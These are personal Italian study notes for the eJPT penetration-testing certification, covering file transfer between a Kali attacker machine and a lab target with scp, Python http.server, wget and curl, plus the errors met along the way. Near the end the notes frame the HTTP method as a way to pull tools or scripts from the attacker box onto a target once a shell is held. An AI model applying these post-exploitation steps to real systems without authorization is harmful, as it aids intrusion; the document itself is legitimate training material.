# File Transfer Notes - eJPT Lab

Appunti personali sui metodi di trasferimento file usati nel laboratorio eJPT.

> Tutte le attività sono svolte esclusivamente in ambiente locale autorizzato.

---

## 1. Obiettivo

Allenare il trasferimento file da e verso una macchina target.

Questa attività è importante per eJPT perché durante un test pratico può essere necessario:

```text
caricare script sul target
scaricare file dal target
recuperare prove
trasferire hash/password
trasferire output di enumeration
scaricare tool o payload in ambiente controllato
```

---

## 2. Macchine usate

```text
Kali Linux
IP: 192.168.1.101
Ruolo: macchina attaccante

Target3-Ubuntu
IP: 192.168.1.104
Hostname: target3
Utente: spywer
Ruolo: macchina target per esercizi SSH e file transfer
```

---

# Metodo 1 - SCP da Kali a Target3

## 3. Creazione file su Kali

Su Kali è stato creato un file di test:

```bash
echo "test file transfer eJPT" > test.txt
```

Verifica:

```bash
ls -la test.txt
cat test.txt
```

Contenuto:

```text
test file transfer eJPT
```

---

## 4. Trasferimento Kali → Target3 con SCP

Comando eseguito da Kali:

```bash
scp test.txt spywer@192.168.1.104:/home/spywer/
```

Quando richiesto, inserire la password dell’utente `spywer`.

---

## 5. Verifica su Target3

Accesso SSH:

```bash
ssh spywer@192.168.1.104
```

Verifica file ricevuto:

```bash
ls -la
cat test.txt
```

Output confermato:

```text
test file transfer eJPT
```

---

# Metodo 2 - SCP da Target3 a Kali

## 6. Creazione cartella ricezione su Kali

Da Kali:

```bash
mkdir -p ~/transfer-test
```

---

## 7. Trasferimento Target3 → Kali con SCP

Da Kali:

```bash
scp spywer@192.168.1.104:/home/spywer/test.txt ~/transfer-test/
```

---

## 8. Verifica su Kali

```bash
ls -la ~/transfer-test
cat ~/transfer-test/test.txt
```

Output confermato:

```text
test file transfer eJPT
```

---

# Metodo 3 - Kali HTTP server + wget/curl da Target3

## 9. Creazione cartella web su Kali

Da Kali:

```bash
mkdir -p ~/web-transfer
cd ~/web-transfer
echo "file servito da Kali via HTTP" > prova-http.txt
```

---

## 10. Avvio server HTTP su Kali

Da Kali, dentro la cartella `~/web-transfer`:

```bash
python3 -m http.server 8000
```

Il server resta in ascolto su:

```text
http://0.0.0.0:8000
```

Dal target il file sarà raggiungibile tramite:

```text
http://192.168.1.101:8000/prova-http.txt
```

---

## 11. Download da Target3 con wget

Da Target3:

```bash
wget http://192.168.1.101:8000/prova-http.txt
```

Output positivo:

```text
HTTP request sent, awaiting response... 200 OK
Saving to: ‘prova-http.txt’
```

---

## 12. Download da Target3 con curl

Da Target3:

```bash
curl -O http://192.168.1.101:8000/prova-http.txt
```

---

## 13. Verifica su Target3

```bash
ls -la
cat prova-http.txt
```

Output confermato:

```text
file servito da Kali via HTTP
```

---

# Metodo 4 - Target3 HTTP server + wget da Kali

## 14. Creazione cartella web su Target3

Da Target3:

```bash
mkdir -p ~/target-web
cd ~/target-web
echo "file servito da target3" > target-file.txt
```

---

## 15. Avvio server HTTP su Target3

Da Target3:

```bash
python3 -m http.server 9000
```

Output corretto:

```text
Serving HTTP on 0.0.0.0 port 9000
```

---

## 16. Download da Kali

Da Kali:

```bash
wget http://192.168.1.104:9000/target-file.txt
```

Output positivo:

```text
HTTP request sent, awaiting response... 200 OK
Saving to: ‘target-file.txt’
```

---

## 17. Verifica su Kali

Da Kali:

```bash
cat target-file.txt
```

Output confermato:

```text
file servito da target3
```

Nel terminale di Target3 il server Python mostra la richiesta ricevuta:

```text
GET /target-file.txt HTTP/1.1 200
```

---

# 18. Errori incontrati e correzioni

## Errore 1 - Cartella sbagliata

Comando errato:

```bash
cd ~target-web
```

Errore:

```text
No such file or directory
```

Motivo:

```text
~target-web cerca un utente chiamato target-web.
```

Comando corretto:

```bash
cd ~/target-web
```

Significato:

```text
~/target-web indica la cartella target-web dentro la home dell’utente corrente.
```

---

## Errore 2 - Porta sbagliata

Comando errato:

```bash
python3 -m http.server 90000
```

Problema:

```text
La porta 90000 non è valida.
Le porte TCP/UDP vanno da 0 a 65535.
```

Comando corretto:

```bash
python3 -m http.server 9000
```

Output corretto:

```text
Serving HTTP on 0.0.0.0 port 9000
```

---

## Errore 3 - Connection refused

Da Kali:

```bash
wget http://192.168.1.104:9000/target-file.txt
```

Errore:

```text
failed: Connection refused
```

Significato:

```text
Sulla porta indicata non c’era nessun servizio in ascolto.
```

Correzione:

```text
Verificare che il server Python sia avviato sulla porta corretta.
```

Comando corretto su Target3:

```bash
python3 -m http.server 9000
```

Poi da Kali:

```bash
wget http://192.168.1.104:9000/target-file.txt
```

---

# 19. Comandi rapidi da ricordare

## SCP upload da Kali a target

```bash
scp file.txt utente@IP_TARGET:/percorso/destinazione/
```

Esempio:

```bash
scp test.txt spywer@192.168.1.104:/home/spywer/
```

---

## SCP download da target a Kali

```bash
scp utente@IP_TARGET:/percorso/file.txt /percorso/locale/
```

Esempio:

```bash
scp spywer@192.168.1.104:/home/spywer/test.txt ~/transfer-test/
```

---

## Avviare server HTTP con Python

```bash
python3 -m http.server PORTA
```

Esempio:

```bash
python3 -m http.server 8000
```

---

## Scaricare file con wget

```bash
wget http://IP:PORTA/file
```

Esempio:

```bash
wget http://192.168.1.101:8000/prova-http.txt
```

---

## Scaricare file con curl

```bash
curl -O http://IP:PORTA/file
```

Esempio:

```bash
curl -O http://192.168.1.101:8000/prova-http.txt
```

---

# 20. Schema mentale

```text
Metodo SCP:
Kali → Target
Target → Kali

Metodo HTTP:
Chi serve il file avvia python3 -m http.server
Chi scarica usa wget o curl
```

---

# 21. Quando usare SCP

Usare SCP quando:

```text
SSH è disponibile
conosci username e password
hai una shell stabile
vuoi trasferire file in modo semplice e sicuro
```

Esempio:

```bash
scp file.txt user@target:/tmp/
```

---

# 22. Quando usare HTTP server

Usare HTTP server quando:

```text
hai una shell sul target
scp non è disponibile
vuoi scaricare velocemente tool/script da Kali
vuoi servire file dalla macchina attaccante
```

Esempio:

```bash
python3 -m http.server 8000
wget http://IP_KALI:8000/file.sh
```

---

# 23. Collegamento con obiettivi eJPT

Questa esercitazione copre l’obiettivo:

```text
Trasferire file da e verso la destinazione
```

Competenze allenate:

```text
SSH
SCP
wget
curl
python3 http.server
verifica file trasferiti
diagnosi errori di rete
diagnosi porte errate
```

---

# 24. Nota etica

Questi comandi sono stati usati solo in laboratorio locale autorizzato.

Non utilizzare tecniche di trasferimento file su sistemi reali senza autorizzazione esplicita.
